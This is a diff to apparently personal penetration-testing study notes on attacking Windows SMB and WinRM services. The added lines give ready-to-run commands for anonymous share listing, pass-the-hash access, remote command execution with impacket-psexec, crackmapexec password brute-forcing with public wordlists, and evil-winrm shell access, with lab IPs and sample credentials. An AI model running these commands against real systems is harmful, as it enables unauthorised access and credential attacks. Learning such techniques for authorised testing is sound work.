@@ -97,7 +97,9 @@ Port no 139 or 445 SMB
 				- enum4linux-ng -A [-u "<username>" -p "<passwd>"] <IP>
 
 		- smbclient
+			- smbclient --no-pass -L //<IP>
 			- smbclient --no-pass //<IP>/<Folder>
+			- smbclient -U 'username' -L //<IP>
 			- smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
 				#Use --no-pass -c 'recurse;ls'  to list recursively with smbclient
 			- smbclient -U '%' -N \\\\<IP>\\<SHARE> # null session to connect to a windows share
@@ -119,6 +121,7 @@ Port no 139 or 445 SMB
 			- smbmap [-u "username" -p "password"] -R [Folder] -H <IP> [-P <PORT>] # Recursive list
 			- smbmap [-u "username" -p "password"] -r [Folder] -H <IP> [-P <PORT>] # Non-Recursive list
 			- smbmap -u "username" -p "<NT>:<LM>" [-r/-R] [Folder] -H <IP> [-P <PORT>] #Pass-the-Hash
+			
 			- smbmap -u <username> -p 'ntlm hash:lm hash' -H <target ip>
 			- smbmap -u <username> -p 'ntlm hash:lm hash' -H <target ip> -r [recursive switch for listing contents]
 			- smbmap -u <username> -p 'ntlm hash:lm hash' -H <target ip> -r alice [share we want to use for recursive switch]
@@ -130,11 +133,39 @@ Port no 139 or 445 SMB
 			# .pem to .ppk
 			- puttygen pemKey.pem -o ppkKey.ppk -O private
 
+	when we have the password
 		- Command Execution on Smb using psexec
 			- impacket-psexec <domain name>/<username>:<password>@<target_ip> <command>
 				- impacket-psexec armourinfosec.local/sachin:@rmour123@192.168.29.100 ipconfig
 
 			- more on https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb#execute-commands
+
+	when we don't have the passwords
+		# list to use /usr/share/seclists/Passwords/500-worst-passwords.txt | /usr/share/seclists/Passwords/darkweb2017-top100.txt
+		# now we have to brute force smb [tool we will use ic crackmapexec]
+
+		SMB
+			- sudo crackmapexec smb <targetip> -u <username or list> -p <password or list> --continue-on-success
+			- sudo crackmapexec smb 10.10.10.10 -u username -p pass -M spider_plus --share 'Department Shares' 
+				- -M spider_plus [--share <share_name>]
+				- --pattern txt
+
+		Winrm
+			- sudo crackmapexec winrm 192.168.29.100 -u monah.bonita -p hello --continue-on-success
+			- sudo crackmapexec winrm 192.168.29.100 -u smbusers.txt -p password1.txt --continue-on-success | grep '(Pwn3d!)'
+			- sudo crackmapexec winrm 192.168.29.100 -u smbusers.txt -p /usr/share/seclists/Passwords/darkweb2017-top100.txt --continue-on-success | grep '(Pwn3d!)'
+
+
+Port no 5985 or 5986 Winrm
+
+	- Utility used to run commands on windows machine and get shell access
+
+	- Tool used = evil.winrm
+		- download link https://github.com/Hackplayers/evil-winrm
+	- evil-winrm  -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!'  
+	- evil-winrm  -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/' [-s can be used to run scripts] 
+
+
 
 
 Hash Cracking
@@ -151,7 +182,7 @@ Hash Cracking
 
 In windows there are 4 ways to execute commands
 
-1. Remote Desktop
-2. Smb
-3. Telnet
-4. winrm
+1. Remote Desktop [3389]
+2. Smb [139 445]
+3. Telnet [23]
+4. Winrm [5985 5986(secure)]
